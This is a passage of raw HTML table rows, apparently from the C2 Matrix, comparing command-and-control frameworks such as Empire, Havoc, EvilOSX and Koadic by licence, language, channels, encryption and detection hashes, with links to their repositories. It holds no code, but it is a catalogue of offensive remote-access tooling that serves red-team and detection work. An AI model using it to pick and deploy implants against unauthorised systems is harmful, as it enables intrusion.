href="https://github.com/DeimosC2/DeimosC2">https://github.com/DeimosC2/DeimosC2</a></td><td></td><td>@CharlesDardaman</td><td>@jasc22</td><td>9&#x2F;17&#x2F;2020</td><td>1.1.0 Beta</td><td>Golang</td><td></td><td></td><td></td><td>Golang</td><td>Golang</td><td>Yes</td><td>Web</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>Encrypted Key Exchange</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td>00000000000000000041d00000041d9535d5979f591ae8e547c5e5743e5b64</td><td><a href="https://www.shodan.io/search?query=http.html_hash:-14029177">Yes</a></td><td>Yes</td><td>No</td><td>NA</td><td>9</td><td></td></tr><tr><td>DiscordGo</td><td>NA</td><td>NA</td><td><a href="https://github.com/emmaunel/DiscordGo">https://github.com/emmaunel/DiscordGo</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Disctopia</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/3ct0s/disctopia-c2">https://github.com/3ct0s/disctopia-c2</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td><a href="https://github.com/nasbench/C2-Matrix-Indicators/tree/main/disctopia-c2/1.0.1">Yes</a></td><td><a href="https://github.com/nasbench/C2-Matrix-Indicators/tree/main/disctopia-c2/1.0.1">Yes</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Eggshell</td><td>GNU GPL2</td><td>NA</td><td><a href="https://github.com/neoneggplant/EggShell">https://github.com/neoneggplant/EggShell</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>emp3r0r</td><td>MIT</td><td>NA</td><td><a href="https://github.com/jm33-m0/emp3r0r">https://github.com/jm33-m0/emp3r0r</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Empire</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/BC-SECURITY/Empire">https://github.com/BC-SECURITY/Empire</a></td><td></td><td>@BCSecurity1</td><td>@jorgeorchilles</td><td>1&#x2F;30&#x2F;2020</td><td>3.0.5</td><td><a href="http://install.sh/">install.sh</a></td><td>Yes</td><td>Yes</td><td><a href="https://pkg.kali.org/pkg/powershell-empire">Yes</a></td><td>Python</td><td>PowerShell</td><td>Yes</td><td>GUI</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>Encrypted Key Exchange</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td></td><td></td><td>Yes</td><td>Yes</td><td></td><td>0ad0ad0000ad0ad22c42d42d000000088658245da669bb571fc2a62dd80912</td><td></td><td>Yes</td><td>#psempire bloodhoundhq.slack.com</td><td>1299</td><td>61</td><td>Dropbox, OneDrive</td></tr><tr><td>EvilOSX</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/Marten4n6/EvilOSX">https://github.com/Marten4n6/EvilOSX</a></td><td></td><td></td><td>@cabbagesalad2</td><td>11&#x2F;12&#x2F;2019</td><td>7.2.1</td><td>pip3</td><td></td><td></td><td>Yes</td><td>Python</td><td>Python</td><td>No</td><td>GUI</td><td></td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>AES</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>89</td><td></td></tr><tr><td>Faction C2</td><td>BSD3</td><td>NA</td><td>Taken down</td><td></td><td></td><td>@jorgeorchilles</td><td>10&#x2F;30&#x2F;2019</td><td>NA</td><td><a href="http://install.sh/">install.sh</a></td><td></td><td></td><td></td><td>.NET</td><td>.NET</td><td>Yes</td><td>Web</td><td></td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>TLS</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>No</td><td></td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td>#factionc2 bloodhoundhq.slack.com</td><td>203</td><td>38</td><td></td></tr><tr><td>FlyingAFalseFlag</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/monoxgas/FlyingAFalseFlag">https://github.com/monoxgas/FlyingAFalseFlag</a></td><td></td><td></td><td>@jorgeorchilles</td><td>11&#x2F;12&#x2F;2019</td><td>POC</td><td>pip3</td><td></td><td></td><td></td><td>Python</td><td>C++</td><td>No</td><td>CLI</td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>None</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>1</td><td>PostOffice EWS SendGrid &amp; Addendum VirusTotal</td></tr><tr><td>FudgeC2</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/Ziconius/FudgeC2">https://github.com/Ziconius/FudgeC2</a></td><td></td><td>@Ziconius</td><td>@jorgeorchilles</td><td>2&#x2F;11&#x2F;2020</td><td>Beta</td><td>pip3</td><td></td><td></td><td>Yes</td><td>Python</td><td>Powershell</td><td>Yes</td><td>Web</td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>None</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td></td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>#fudgec2 bloodhoundhq.slack.com</td><td>NA</td><td>3</td><td></td></tr><tr><td>GC2-sheet</td><td>NA</td><td>NA</td><td><a href="https://github.com/looCiprian/GC2-sheet">https://github.com/looCiprian/GC2-sheet</a></td><td></td><td>@loogrz</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Google Sheets and Drive</td></tr><tr><td>gcat</td><td>BSD2</td><td>NA</td><td><a href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a></td><td></td><td>@byt3bl33d3r</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td></td><td></td><td></td><td></td></tr><tr><td>GoBot2</td><td>MIT</td><td>NA</td><td><a href="https://github.com/SaturnsVoid/GoBot2">https://github.com/SaturnsVoid/GoBot2</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>GodGenesis</td><td>NA</td><td>NA</td><td><a href="https://github.com/SaumyajeetDas/GodGenesis">https://github.com/SaumyajeetDas/GodGenesis</a></td><td></td><td>@SaumyajeetDas21</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>godoh</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/sensepost/goDoH">https://github.com/sensepost/goDoH</a></td><td></td><td>@leonjza</td><td>@cabbagesalad2</td><td>10&#x2F;31&#x2F;2019</td><td>1.6</td><td>binary</td><td></td><td></td><td>Yes</td><td>Go</td><td>Go</td><td>No</td><td>CLI</td><td></td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>None</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>1</td><td></td></tr><tr><td>Google Calendar RAT</td><td>MIT</td><td>NA</td><td><a href="https://github.com/MrSaighnal/GCR-Google-Calendar-RAT">https://github.com/MrSaighnal/GCR-Google-Calendar-RAT</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Google Socks</td><td>NA</td><td>NA</td><td><a href="https://github.com/lukebaggett/google_socks">https://github.com/lukebaggett/google_socks</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td></td><td></td><td></td><td></td></tr><tr><td>GRAT2</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/r3nhat/GRAT2">https://github.com/r3nhat/GRAT2</a></td><td></td><td>@r3n_hat</td><td>@r3n_hat</td><td>9&#x2F;1&#x2F;2021</td><td>Beta</td><td></td><td></td><td>No</td><td>No</td><td>Python</td><td>C#</td><td>No</td><td>CLI</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>0</td><td>Encrypted Communication using XOR</td></tr><tr><td>Grim Reaper C2</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/d4rckh/grc2">https://github.com/d4rckh/grc2</a></td><td></td><td>@d4rckh</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Previously NimC2</td></tr><tr><td>HardHatC2</td><td>NA</td><td>NA</td><td><a href="https://github.com/DragoQCC/HardHatC2">https://github.com/DragoQCC/HardHatC2</a></td><td></td><td>@DragoQcc</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>HARS</td><td>MIT</td><td>NA</td><td><a href="https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell">https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell</a></td><td></td><td></td><td>@leekirkpatrick4</td><td>3&#x2F;24&#x2F;2020</td><td>POC</td><td>python</td><td></td><td></td><td></td><td>Python</td><td>C#</td><td>No</td><td>CLI</td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>None</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>2</td><td></td></tr><tr><td>Haven</td><td>Commercial</td><td>Contact Sales</td><td><a href="https://pivotlabs.dev/haven/">https://pivotlabs.dev/haven/</a></td><td><a href="https://docs.pivotlabs.dev/index.html">https://docs.pivotlabs.dev/index.html</a></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Havoc</td><td>GNU GLP3</td><td>NA</td><td><a href="https://github.com/HavocFramework/Havoc">https://github.com/HavocFramework/Havoc</a></td><td></td><td>@C5pider</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td>10&#x2F;2&#x2F;2022</td><td></td><td></td><td></td><td></td><td></td><td>Golang</td><td>C</td><td>Yes</td><td>GUI</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>None</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td><a href="https://www.zscaler.com/blogs/security-research/havoc-across-cyberspace">Yes</a></td><td>No</td><td>No</td><td>Yes</td><td></td><td>Yes</td><td></td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td></td></tr><tr><td>Heroinn</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/b23r0/Heroinn">https://github.com/b23r0/Heroinn</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>HTTP-RevShell</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/3v4Si0N/HTTP-revshell">https://github.com/3v4Si0N/HTTP-revshell</a></td><td></td><td>@3v4Si0N</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>ibombshell</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/ElevenPaths/ibombshell">https://github.com/ElevenPaths/ibombshell</a></td><td></td><td></td><td>@jorgeorchilles</td><td>11&#x2F;12&#x2F;2019</td><td>0.0.3b</td><td>pip3</td><td>Yes</td><td></td><td>Yes</td><td>Python</td><td>PowerShell</td><td>No</td><td>GUI</td><td></td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>None</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>5</td><td></td></tr><tr><td>INNUENDO</td><td>Commercial</td><td>Contact Sales</td><td></td><td><a href="https://www.immunityinc.com/products/innuendo/">https://www.immunityinc.com/products/innuendo/</a></td><td></td><td>@daveaitel</td><td>11&#x2F;11&#x2F;2019</td><td>1.7</td><td><a href="http://install.sh/">install.sh</a></td><td></td><td></td><td></td><td>Python</td><td>Python</td><td>Yes</td><td>Web</td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td>Encrypted Key Exchange</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td></td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>NA</td><td></td></tr><tr><td>Khepri</td><td>Apache 2</td><td>NA</td><td><a href="https://github.com/geemion/Khepri">https://github.com/geemion/Khepri</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Koadic C3</td><td>Apache 2</td><td>NA</td><td><a href="https://github.com/offsecginger/koadic">https://github.com/offsecginger/koadic</a></td><td></td><td></td><td>@jorgeorchilles</td><td>9&#x2F;27&#x2F;2019</td><td>0xA (10)</td><td>pip3</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Python</td><td>JScript&#x2F;VBScript</td><td>No</td><td>GUI</td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>None</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>94</td><td>Requires valid cert for HTTPS</td></tr><tr><td>Link</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/postrequest/link">https://github.com/postrequest/link</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>LOLBITS</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/Kudaes/LOLBITS">https://github.com/Kudaes/LOLBITS</a></td><td></td><td>@Kurosh2907</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MacC2</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/cedowens/MacC2">https://github.com/cedowens/MacC2</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>2ad2ad0002ad2ad22c42d42d000000faabb8fd156aa8b4d8a37853e1063261</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MaccaroniC2</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/CalfCrusher/MaccaroniC2">https://github.com/CalfCrusher/MaccaroniC2</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MACE</td><td>NA</td><td>NA</td><td><a href="https://github.com/nickvangilder/most-average-c2-ever">https://github.com/nickvangilder/most-average-c2-ever</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Python</td><td></td><td>No</td><td>CLI</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MacShellSwift</td><td>NA</td><td>NA</td><td><a href="https://github.com/cedowens/MacShellSwift">https://github.com/cedowens/MacShellSwift</a></td><td></td><td>@cedowens</td><td>@Adam_Mashinchi</td><td>11&#x2F;13&#x2F;2019</td><td>N&#x2F;A</td><td>python</td><td></td><td>Yes</td><td></td><td>Python</td><td>Swift</td><td>No</td><td>CLI</td><td></td><td>No</td><td>No</td><td>No</td><td>Yes</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>TLS</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td>2ad000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46</td><td></td><td>No</td><td>No</td><td>NA</td><td>0</td><td></td></tr><tr><td>Manjusaka</td><td>NA</td><td>NA</td><td><a href="https://github.com/YDHCUI/manjusaka">https://github.com/YDHCUI/manjusaka</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td><a href="https://blog.talosintelligence.com/2022/08/manjusaka-offensive-framework.html">Yes</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MeetC2</td><td>NA</td><td>NA</td><td><a href="https://github.com/CMatri/MeetC2">https://github.com/CMatri/MeetC2</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MeliziaC2</td><td>Created Commons</td><td>NA</td><td><a href="https://github.com/demon-i386/MeliziaC2">https://github.com/demon-i386/MeliziaC2</a></td><td></td><td></td><td><a 